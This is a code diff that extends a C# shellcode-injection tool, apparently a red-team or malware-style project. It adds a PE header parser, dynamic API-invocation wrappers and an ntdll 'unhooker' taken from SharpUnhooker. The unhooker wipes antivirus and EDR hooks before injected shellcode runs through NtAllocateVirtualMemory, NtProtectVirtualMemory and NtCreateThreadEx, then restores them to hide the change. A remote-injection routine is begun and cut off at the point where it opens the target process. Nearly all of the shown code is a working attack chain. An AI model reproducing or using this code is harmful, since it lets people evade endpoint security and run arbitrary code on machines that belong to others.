@@ -6,6 +6,386 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Diagnostics;
 
+// PEReader for my Unhooker
+public class PEReader
+{
+    public struct IMAGE_DOS_HEADER
+    {      // DOS .EXE header
+        public UInt16 e_magic;              // Magic number
+        public UInt16 e_cblp;               // Bytes on last page of file
+        public UInt16 e_cp;                 // Pages in file
+        public UInt16 e_crlc;               // Relocations
+        public UInt16 e_cparhdr;            // Size of header in paragraphs
+        public UInt16 e_minalloc;           // Minimum extra paragraphs needed
+        public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
+        public UInt16 e_ss;                 // Initial (relative) SS value
+        public UInt16 e_sp;                 // Initial SP value
+        public UInt16 e_csum;               // Checksum
+        public UInt16 e_ip;                 // Initial IP value
+        public UInt16 e_cs;                 // Initial (relative) CS value
+        public UInt16 e_lfarlc;             // File address of relocation table
+        public UInt16 e_ovno;               // Overlay number
+        public UInt16 e_res_0;              // Reserved words
+        public UInt16 e_res_1;              // Reserved words
+        public UInt16 e_res_2;              // Reserved words
+        public UInt16 e_res_3;              // Reserved words
+        public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
+        public UInt16 e_oeminfo;            // OEM information; e_oemid specific
+        public UInt16 e_res2_0;             // Reserved words
+        public UInt16 e_res2_1;             // Reserved words
+        public UInt16 e_res2_2;             // Reserved words
+        public UInt16 e_res2_3;             // Reserved words
+        public UInt16 e_res2_4;             // Reserved words
+        public UInt16 e_res2_5;             // Reserved words
+        public UInt16 e_res2_6;             // Reserved words
+        public UInt16 e_res2_7;             // Reserved words
+        public UInt16 e_res2_8;             // Reserved words
+        public UInt16 e_res2_9;             // Reserved words
+        public UInt32 e_lfanew;             // File address of new exe header
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct IMAGE_DATA_DIRECTORY
+    {
+        public UInt32 VirtualAddress;
+        public UInt32 Size;
+    }
+
+    [StructLayout(LayoutKind.Sequential, Pack = 1)]
+    public struct IMAGE_OPTIONAL_HEADER32
+    {
+        public UInt16 Magic;
+        public Byte MajorLinkerVersion;
+        public Byte MinorLinkerVersion;
+        public UInt32 SizeOfCode;
+        public UInt32 SizeOfInitializedData;
+        public UInt32 SizeOfUninitializedData;
+        public UInt32 AddressOfEntryPoint;
+        public UInt32 BaseOfCode;
+        public UInt32 BaseOfData;
+        public UInt32 ImageBase;
+        public UInt32 SectionAlignment;
+        public UInt32 FileAlignment;
+        public UInt16 MajorOperatingSystemVersion;
+        public UInt16 MinorOperatingSystemVersion;
+        public UInt16 MajorImageVersion;
+        public UInt16 MinorImageVersion;
+        public UInt16 MajorSubsystemVersion;
+        public UInt16 MinorSubsystemVersion;
+        public UInt32 Win32VersionValue;
+        public UInt32 SizeOfImage;
+        public UInt32 SizeOfHeaders;
+        public UInt32 CheckSum;
+        public UInt16 Subsystem;
+        public UInt16 DllCharacteristics;
+        public UInt32 SizeOfStackReserve;
+        public UInt32 SizeOfStackCommit;
+        public UInt32 SizeOfHeapReserve;
+        public UInt32 SizeOfHeapCommit;
+        public UInt32 LoaderFlags;
+        public UInt32 NumberOfRvaAndSizes;
+
+        public IMAGE_DATA_DIRECTORY ExportTable;
+        public IMAGE_DATA_DIRECTORY ImportTable;
+        public IMAGE_DATA_DIRECTORY ResourceTable;
+        public IMAGE_DATA_DIRECTORY ExceptionTable;
+        public IMAGE_DATA_DIRECTORY CertificateTable;
+        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
+        public IMAGE_DATA_DIRECTORY Debug;
+        public IMAGE_DATA_DIRECTORY Architecture;
+        public IMAGE_DATA_DIRECTORY GlobalPtr;
+        public IMAGE_DATA_DIRECTORY TLSTable;
+        public IMAGE_DATA_DIRECTORY LoadConfigTable;
+        public IMAGE_DATA_DIRECTORY BoundImport;
+        public IMAGE_DATA_DIRECTORY IAT;
+        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
+        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
+        public IMAGE_DATA_DIRECTORY Reserved;
+    }
+
+    [StructLayout(LayoutKind.Sequential, Pack = 1)]
+    public struct IMAGE_OPTIONAL_HEADER64
+    {
+        public UInt16 Magic;
+        public Byte MajorLinkerVersion;
+        public Byte MinorLinkerVersion;
+        public UInt32 SizeOfCode;
+        public UInt32 SizeOfInitializedData;
+        public UInt32 SizeOfUninitializedData;
+        public UInt32 AddressOfEntryPoint;
+        public UInt32 BaseOfCode;
+        public UInt64 ImageBase;
+        public UInt32 SectionAlignment;
+        public UInt32 FileAlignment;
+        public UInt16 MajorOperatingSystemVersion;
+        public UInt16 MinorOperatingSystemVersion;
+        public UInt16 MajorImageVersion;
+        public UInt16 MinorImageVersion;
+        public UInt16 MajorSubsystemVersion;
+        public UInt16 MinorSubsystemVersion;
+        public UInt32 Win32VersionValue;
+        public UInt32 SizeOfImage;
+        public UInt32 SizeOfHeaders;
+        public UInt32 CheckSum;
+        public UInt16 Subsystem;
+        public UInt16 DllCharacteristics;
+        public UInt64 SizeOfStackReserve;
+        public UInt64 SizeOfStackCommit;
+        public UInt64 SizeOfHeapReserve;
+        public UInt64 SizeOfHeapCommit;
+        public UInt32 LoaderFlags;
+        public UInt32 NumberOfRvaAndSizes;
+
+        public IMAGE_DATA_DIRECTORY ExportTable;
+        public IMAGE_DATA_DIRECTORY ImportTable;
+        public IMAGE_DATA_DIRECTORY ResourceTable;
+        public IMAGE_DATA_DIRECTORY ExceptionTable;
+        public IMAGE_DATA_DIRECTORY CertificateTable;
+        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
+        public IMAGE_DATA_DIRECTORY Debug;
+        public IMAGE_DATA_DIRECTORY Architecture;
+        public IMAGE_DATA_DIRECTORY GlobalPtr;
+        public IMAGE_DATA_DIRECTORY TLSTable;
+        public IMAGE_DATA_DIRECTORY LoadConfigTable;
+        public IMAGE_DATA_DIRECTORY BoundImport;
+        public IMAGE_DATA_DIRECTORY IAT;
+        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
+        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
+        public IMAGE_DATA_DIRECTORY Reserved;
+    }
+
+    [StructLayout(LayoutKind.Sequential, Pack = 1)]
+    public struct IMAGE_FILE_HEADER
+    {
+        public UInt16 Machine;
+        public UInt16 NumberOfSections;
+        public UInt32 TimeDateStamp;
+        public UInt32 PointerToSymbolTable;
+        public UInt32 NumberOfSymbols;
+        public UInt16 SizeOfOptionalHeader;
+        public UInt16 Characteristics;
+    }
+
+    [StructLayout(LayoutKind.Explicit)]
+    public struct IMAGE_SECTION_HEADER
+    {
+        [FieldOffset(0)]
+        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
+        public char[] Name;
+        [FieldOffset(8)]
+        public UInt32 VirtualSize;
+        [FieldOffset(12)]
+        public UInt32 VirtualAddress;
+        [FieldOffset(16)]
+        public UInt32 SizeOfRawData;
+        [FieldOffset(20)]
+        public UInt32 PointerToRawData;
+        [FieldOffset(24)]
+        public UInt32 PointerToRelocations;
+        [FieldOffset(28)]
+        public UInt32 PointerToLinenumbers;
+        [FieldOffset(32)]
+        public UInt16 NumberOfRelocations;
+        [FieldOffset(34)]
+        public UInt16 NumberOfLinenumbers;
+        [FieldOffset(36)]
+        public DataSectionFlags Characteristics;
+
+        public string Section
+        {
+            get { 
+                int i = Name.Length - 1;
+                while (Name[i] == 0) {
+                    --i;
+                }
+                char[] NameCleaned = new char[i+1];
+                Array.Copy(Name, NameCleaned, i+1);
+                return new string(NameCleaned); 
+            }
+        }
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct IMAGE_BASE_RELOCATION
+    {
+        public uint VirtualAdress;
+        public uint SizeOfBlock;
+    }
+
+    [Flags]
+    public enum DataSectionFlags : uint
+    {
+
+        Stub = 0x00000000,
+
+    }
+
+
+    /// The DOS header
+
+    private IMAGE_DOS_HEADER dosHeader;
+
+    /// The file header
+
+    private IMAGE_FILE_HEADER fileHeader;
+
+    /// Optional 32 bit file header 
+
+    private IMAGE_OPTIONAL_HEADER32 optionalHeader32;
+
+    /// Optional 64 bit file header 
+
+    private IMAGE_OPTIONAL_HEADER64 optionalHeader64;
+
+    /// Image Section headers. Number of sections is in the file header.
+
+    private IMAGE_SECTION_HEADER[] imageSectionHeaders;
+
+    private byte[] rawbytes;
+
+
+
+    public PEReader(string filePath)
+    {
+        // Read in the DLL or EXE and get the timestamp
+        using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
+        {
+            BinaryReader reader = new BinaryReader(stream);
+            dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);
+
+            // Add 4 bytes to the offset
+            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
+
+            UInt32 ntHeadersSignature = reader.ReadUInt32();
+            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
+            if (this.Is32BitHeader)
+            {
+                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
+            }
+            else
+            {
+                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
+            }
+
+            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
+            for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
+            {
+                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
+            }
+
+            rawbytes = System.IO.File.ReadAllBytes(filePath);
+
+        }
+    }
+
+    public PEReader(byte[] fileBytes)
+    {
+        // Read in the DLL or EXE and get the timestamp
+        using (MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
+        {
+            BinaryReader reader = new BinaryReader(stream);
+            dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);
+
+            // Add 4 bytes to the offset
+            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
+
+            UInt32 ntHeadersSignature = reader.ReadUInt32();
+            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
+            if (this.Is32BitHeader)
+            {
+                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
+            }
+            else
+            {
+                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
+            }
+
+            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
+            for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
+            {
+                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
+            }
+
+            rawbytes = fileBytes;
+
+        }
+    }
+
+
+    public static T FromBinaryReader<T>(BinaryReader reader)
+    {
+        // Read in a byte array
+        byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));
+
+        // Pin the managed memory while, copy it out the data, then unpin it
+        GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
+        T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
+        handle.Free();
+
+        return theStructure;
+    }
+
+
+
+    public bool Is32BitHeader
+    {
+        get
+        {
+            UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
+            return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
+        }
+    }
+
+
+    public IMAGE_FILE_HEADER FileHeader
+    {
+        get
+        {
+            return fileHeader;
+        }
+    }
+
+
+    /// Gets the optional header
+
+    public IMAGE_OPTIONAL_HEADER32 OptionalHeader32
+    {
+        get
+        {
+            return optionalHeader32;
+        }
+    }
+
+
+    /// Gets the optional header
+
+    public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
+    {
+        get
+        {
+            return optionalHeader64;
+        }
+    }
+
+    public IMAGE_SECTION_HEADER[] ImageSectionHeaders
+    {
+        get
+        {
+            return imageSectionHeaders;
+        }
+    }
+
+    public byte[] RawBytes
+    {
+        get
+        {
+            return rawbytes;
+        }
+
+    }
+
+}
+
 public class DInvokeCore {
 	// Required NTSTATUSs 
     public enum NTSTATUS : uint {
@@ -494,6 +874,62 @@ public class DInvokeCore {
         GenericAll = 0x10000000
     }
 
+    [StructLayout(LayoutKind.Sequential)]
+    public struct STARTUPINFO
+    {
+        public uint cb;
+        public IntPtr lpReserved;
+        public IntPtr lpDesktop;
+        public IntPtr lpTitle;
+        public uint dwX;
+        public uint dwY;
+        public uint dwXSize;
+        public uint dwYSize;
+        public uint dwXCountChars;
+        public uint dwYCountChars;
+        public uint dwFillAttributes;
+        public uint dwFlags;
+        public ushort wShowWindow;
+        public ushort cbReserved;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdErr;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct STARTUPINFOEX
+    {
+        public STARTUPINFO StartupInfo;
+        public IntPtr lpAttributeList;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct SECURITY_ATTRIBUTES
+    {
+        public int nLength;
+        public IntPtr lpSecurityDescriptor;
+        public int bInheritHandle;
+    }
+
+    [Flags]
+    public enum CreationFlags
+    {
+        CreateSuspended = 0x00000004,
+        DetachedProcess = 0x00000008,
+        CreateNoWindow = 0x08000000,
+        CreateUnicodeEnv = 0x00000400
+    }
+
     private static IntPtr GetLibraryAddress(string DLLName, string FunctionName) {
         IntPtr hModule = GetLoadedModuleAddress(DLLName);
         if (hModule == IntPtr.Zero) {
@@ -646,6 +1082,18 @@ public class DInvokeCore {
             ThreadAccess DesiredAccess,
             ref OBJECT_ATTRIBUTES ObjectAttributes,
             ref CLIENT_ID ClientId);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate Boolean CreateProcess(string lpApplicationName, 
+            string lpCommandLine, 
+            ref SECURITY_ATTRIBUTES lpProcessAttributes, 
+            ref SECURITY_ATTRIBUTES lpThreadAttributes, 
+            bool bInheritHandles, 
+            CreationFlags dwCreationFlags, 
+            IntPtr lpEnvironment, 
+            string lpCurrentDirectory, 
+            [In] ref STARTUPINFOEX lpStartupInfo, 
+            out PROCESS_INFORMATION lpProcessInformation);
     }
 
     public static NTSTATUS NtCreateThreadEx(
@@ -851,82 +1299,149 @@ public class DInvokeCore {
         return ThreadHandle;
     }
 
-    public static void NtSuspendThread(IntPtr ThreadHandle) {
+    public static bool NtProtectVirtualMemoryBool(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect) {
         // Craft an array for the arguments
-        object[] funcargs = { ThreadHandle };
+        OldProtect = 0;
+        object[] funcargs = { ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect };
 
-        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtSuspendThread", typeof(Delegates.NtSuspendThread), ref funcargs);
-        if (retValue != NTSTATUS.Success || retValue != NTSTATUS.Wait0) {
-            throw new InvalidOperationException("Shit cock happens, " + retValue);
+        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtProtectVirtualMemory", typeof(Delegates.NtProtectVirtualMemory), ref funcargs);
+        if (retValue != NTSTATUS.Success)
+        {
+            return false;
         }
+
+        OldProtect = (UInt32)funcargs[4];
+        return true;
+    }
+
+    public static bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation) {
+        // Craft an array for the arguments
+        lpProcessInformation = new PROCESS_INFORMATION();
+        object[] funcargs = { lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation };
+        bool retValue = (bool)DynamicAPIInvoke(@"kernel32.dll", @"CreateProcessA", typeof(Delegates.CreateProcess), ref funcargs);
+        // update modified variables
+        lpProcessAttributes = (SECURITY_ATTRIBUTES)funcargs[2];
+        lpThreadAttributes = (SECURITY_ATTRIBUTES)funcargs[3];
+        lpProcessInformation = (PROCESS_INFORMATION)funcargs[9];
+        //lpStartupInfo = (STARTUPINFOEX)funcargs[8];
+        return retValue;
     }
 }
 
 public class JALSI {
 
-    [StructLayout(LayoutKind.Sequential)]
-    public struct STARTUPINFO
-    {
-        public uint cb;
-        public IntPtr lpReserved;
-        public IntPtr lpDesktop;
-        public IntPtr lpTitle;
-        public uint dwX;
-        public uint dwY;
-        public uint dwXSize;
-        public uint dwYSize;
-        public uint dwXCountChars;
-        public uint dwYCountChars;
-        public uint dwFillAttributes;
-        public uint dwFlags;
-        public ushort wShowWindow;
-        public ushort cbReserved;
-        public IntPtr lpReserved2;
-        public IntPtr hStdInput;
-        public IntPtr hStdOutput;
-        public IntPtr hStdErr;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct STARTUPINFOEX
-    {
-        public STARTUPINFO StartupInfo;
-        public IntPtr lpAttributeList;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct PROCESS_INFORMATION
-    {
-        public IntPtr hProcess;
-        public IntPtr hThread;
-        public int dwProcessId;
-        public int dwThreadId;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct SECURITY_ATTRIBUTES
-    {
-        public int nLength;
-        public IntPtr lpSecurityDescriptor;
-        public int bInheritHandle;
-    }
-
-    [Flags]
-    public enum CreationFlags
-    {
-        CreateSuspended = 0x00000004,
-        DetachedProcess = 0x00000008,
-        CreateNoWindow = 0x08000000,
-        CreateUnicodeEnv = 0x00000400
-    }
-
     // Ple-please forgive me from using P/Invoke,ma-master
     [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref DInvokeCore.SECURITY_ATTRIBUTES lpProcessAttributes, ref DInvokeCore.SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, DInvokeCore.CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref DInvokeCore.STARTUPINFOEX lpStartupInfo, out DInvokeCore.PROCESS_INFORMATION lpProcessInformation);
 
+    // anti RWX team
     public static UInt32 PAGE_READWRITE = 0x04; 
     public static UInt32 PAGE_EXECUTE_READ = 0x20;
-    public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+
+    // code "borrowed" from SharpUnhooker
+    private static void SilentUnhooker(string DLLname) {
+        IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
+        // get original .text section from original DLL
+        string DLLFullPath;
+        try {
+            // not only get the full path of the DLL,this can prove wether the DLL is loaded or not
+            DLLFullPath = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName);
+            Console.WriteLine("[*] {0} is located on {1}", DLLname, DLLFullPath);
+        }catch {
+            throw new InvalidOperationException("DLL is not loaded!");
+        }
+        byte[] DLLBytes = System.IO.File.ReadAllBytes(DLLFullPath);
+        PEReader OriginalDLL = new PEReader(DLLBytes);
+        for (int i = 0; i < OriginalDLL.FileHeader.NumberOfSections; i++) {
+            if (OriginalDLL.ImageSectionHeaders[i].Section == ".text") {
+                // read and copy .text section
+                IntPtr byteLocationOnMemory = Marshal.AllocHGlobal((int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
+                Marshal.Copy(OriginalDLL.RawBytes, (int)OriginalDLL.ImageSectionHeaders[i].PointerToRawData, byteLocationOnMemory, (int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
+                byte[] assemblyBytes = new byte[OriginalDLL.ImageSectionHeaders[i].SizeOfRawData];
+                Marshal.Copy(byteLocationOnMemory, assemblyBytes, 0, (int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
+                Marshal.FreeHGlobal(byteLocationOnMemory);
+                int TextSectionNumber = i;
+                if (assemblyBytes != null && assemblyBytes.Length > 0) {
+                    IntPtr ModuleHandleInMemory = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
+                    if (ModuleHandleInMemory != IntPtr.Zero) {
+                        IntPtr InMemorySectionPointer = ModuleHandleInMemory + (int)OriginalDLL.ImageSectionHeaders[TextSectionNumber].VirtualAddress;
+                        UInt32 oldProtect = 0;
+                        IntPtr assemblyBytesLength = new IntPtr(assemblyBytes.Length);
+                        bool updateMemoryProtection = DInvokeCore.NtProtectVirtualMemoryBool(CurrentProcessHandle, ref InMemorySectionPointer, ref assemblyBytesLength, (UInt32)0x40, ref oldProtect);
+                        if (updateMemoryProtection) {
+                            Marshal.Copy(assemblyBytes, 0, InMemorySectionPointer, assemblyBytes.Length);
+                            byte[] assemblyBytesAfterPatched = new byte[OriginalDLL.ImageSectionHeaders[TextSectionNumber].SizeOfRawData];
+                            IntPtr readPatchedAPI = InMemorySectionPointer;
+                            Marshal.Copy(readPatchedAPI, assemblyBytesAfterPatched, 0, (int)OriginalDLL.ImageSectionHeaders[TextSectionNumber].SizeOfRawData);
+                            bool checkAssemblyBytesAfterPatched = assemblyBytesAfterPatched.SequenceEqual(assemblyBytes);
+                            UInt32 newProtect = 0;
+                            DInvokeCore.NtProtectVirtualMemoryBool(CurrentProcessHandle, ref InMemorySectionPointer, ref assemblyBytesLength, oldProtect, ref newProtect);
+                            if (!checkAssemblyBytesAfterPatched) {
+                                Console.WriteLine("[-] Patched DLL Bytes Doesnt Match With Original DLL Bytes! DLL Is Not Refreshed!");
+                            }else {
+                                Console.WriteLine("[+] DLL Is Refreshed!");
+                            }
+                        }else {
+                            Console.WriteLine("[-] Failed to update memory protection setting! [-]");
+                        }
+                    }else {
+                        Console.WriteLine("[-] Failed to get handle of in-memory module! [-]");
+                    }
+                }else {
+                    Console.WriteLine("[-] Reading original DLL from disk failed! [-]");
+                }
+            }
+        }
+    }
+
+    private static void SaveDLLTextFromMem(string DLLname, ref byte[] DLLOnMem) {
+        string DLLFullPath;
+        try {
+            // not only get the full path of the DLL,this can prove wether the DLL is loaded or not
+            DLLFullPath = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName);
+        }catch {
+            throw new InvalidOperationException("DLL is not loaded!");
+        }
+        byte[] DLLBytes = System.IO.File.ReadAllBytes(DLLFullPath);
+        PEReader OriginalDLL = new PEReader(DLLBytes);
+        for (int i = 0; i < OriginalDLL.FileHeader.NumberOfSections; i++) {
+            if (OriginalDLL.ImageSectionHeaders[i].Section == ".text") {
+                IntPtr DLLHandleInMemory = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
+                IntPtr InMemoryTextSectionPointer = DLLHandleInMemory + (int)OriginalDLL.ImageSectionHeaders[i].VirtualAddress;
+                DLLOnMem = new byte[((int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData)];
+                Marshal.Copy(InMemoryTextSectionPointer, DLLOnMem, 0, (int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
+            }
+        }
+    }
+
+    private static void PatchDLLTextOnMem(byte[] DLLBytes, string DLLname) {
+        IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
+        string DLLFullPath;
+        try {
+            // not only get the full path of the DLL,this can prove wether the DLL is loaded or not
+            DLLFullPath = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName);
+        }catch {
+            throw new InvalidOperationException("DLL is not loaded!");
+        }
+        byte[] OriginalDLLBytes = System.IO.File.ReadAllBytes(DLLFullPath);
+        PEReader OriginalDLL = new PEReader(OriginalDLLBytes);
+        for (int i = 0; i < OriginalDLL.FileHeader.NumberOfSections; i++) {
+            if (OriginalDLL.ImageSectionHeaders[i].Section == ".text") {
+                IntPtr DLLHandleInMemory = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
+                IntPtr InMemoryTextSectionPointer = DLLHandleInMemory + (int)OriginalDLL.ImageSectionHeaders[i].VirtualAddress;
+                UInt32 oldProtect = 0;
+                IntPtr DLLBytesSize = new IntPtr(DLLBytes.Length);
+                bool updateMemoryProtection = DInvokeCore.NtProtectVirtualMemoryBool(CurrentProcessHandle, ref InMemoryTextSectionPointer, ref DLLBytesSize, (UInt32)0x40, ref oldProtect);
+                if (updateMemoryProtection) {
+                    Marshal.Copy(DLLBytes, 0, InMemoryTextSectionPointer, DLLBytes.Length);
+                    UInt32 newProtect = 0;
+                    DInvokeCore.NtProtectVirtualMemoryBool(CurrentProcessHandle, ref InMemoryTextSectionPointer, ref DLLBytesSize, oldProtect, ref newProtect);
+                }else {
+                    Console.WriteLine("[-] Failed to update memory protection setting! [-]");
+                }
+            }
+        }
+    }
 
 	public static bool LocalInject(byte[] syelkot) {
 		// just another dope-ass banner :D
@@ -935,10 +1450,18 @@ public class JALSI {
 		Console.WriteLine("[           Written By GetRektBoy724           ]");
 		Console.WriteLine("[----------------------------------------------]");
 		Console.WriteLine("[          ----!SEQUENCE=STARTED!----          ]");
+        Console.WriteLine("[*] Running Memory DLL Refresher (SharpUnhooker ofcourse) ...");
+        // save DLL from memory for later we're going to restore (in-case if AVs/EDRs hooked it)
+        byte[] SavedDLLBeforeUnhooked = new byte[0];
+        SaveDLLTextFromMem("ntdll.dll", ref SavedDLLBeforeUnhooked);
+        SilentUnhooker("ntdll.dll");
 		IntPtr ProcessHandle = new IntPtr(-1); // we just need our pseudo-handle,this is just the same as GetCurrentProcess function ;)
 	    IntPtr syelkotLength = new IntPtr(syelkot.Length);
+        IntPtr AllocationAddress = new IntPtr();
+        IntPtr ZeroBitsThatZero = IntPtr.Zero;
+        UInt32 AllocationType = (UInt32)DInvokeCore.AllocationType.Commit | (UInt32)DInvokeCore.AllocationType.Reserve;
 	    Console.WriteLine("[*] Allocating memory...");
-        IntPtr AllocationAddress = Marshal.AllocHGlobal((int)syelkot.Length);
+        DInvokeCore.NtAllocateVirtualMemory(ProcessHandle, ref AllocationAddress, ZeroBitsThatZero, ref syelkotLength, AllocationType, PAGE_READWRITE);
 		Console.WriteLine("[+] Memory allocated at : {0}!", AllocationAddress.ToString("X4"));
 		Console.WriteLine("[*] Copying sh3llc0d3 at allocated memory... ");
 		// copying/planting syelkot to allocated memory
@@ -950,7 +1473,7 @@ public class JALSI {
 		if (checkSyelkotAfterPlanted) {
             Console.WriteLine("[+] Sh3llc0d3 planted and ready to get executed!");
             UInt32 newProtect = 0;
-            DInvokeCore.NtProtectVirtualMemory(ProcessHandle, ref AllocationAddress, ref syelkotLength, PAGE_EXECUTE_READWRITE, ref newProtect);
+            DInvokeCore.NtProtectVirtualMemory(ProcessHandle, ref AllocationAddress, ref syelkotLength, PAGE_EXECUTE_READ, ref newProtect);
 			// parameters for NtCreateThreadEx
 			IntPtr threadHandle = new IntPtr(0);
             DInvokeCore.ACCESS_MASK desiredAccess = DInvokeCore.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | DInvokeCore.ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
@@ -967,6 +1490,8 @@ public class JALSI {
             var createThreadResult = DInvokeCore.NtCreateThreadEx(ref threadHandle, desiredAccess, pObjectAttributes, ProcessHandle, AllocationAddress, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
             if (threadHandle != ZeroPointerToCheck) {
             	Console.WriteLine("[+] Thread created at {0}! Sh3llc0d3 executed!", threadHandle.ToString("X4"));
+                // restore in-memory DLL
+                PatchDLLTextOnMem(SavedDLLBeforeUnhooked, "ntdll.dll");
                 Console.WriteLine("[         ----!SEQUENCE==FINISHED!----         ]");
         		return true;
             }else {
@@ -986,6 +1511,11 @@ public class JALSI {
         Console.WriteLine("[           Written By GetRektBoy724           ]");
         Console.WriteLine("[----------------------------------------------]");
         Console.WriteLine("[          ----!SEQUENCE=STARTED!----          ]");
+        Console.WriteLine("[*] Running Memory DLL Refresher (SharpUnhooker ofcourse) ...");
+        // save DLL from memory for later we're going to restore (in-case if AVs/EDRs hooked it)
+        byte[] SavedDLLBeforeUnhooked = new byte[0];
+        SaveDLLTextFromMem("ntdll.dll", ref SavedDLLBeforeUnhooked);
+        SilentUnhooker("ntdll.dll");
         IntPtr TargetProcessHandle = DInvokeCore.NtOpenProcess((UInt32)TargetProcessID, DInvokeCore.ProcessAccessFlags.PROCESS_ALL_ACCESS);
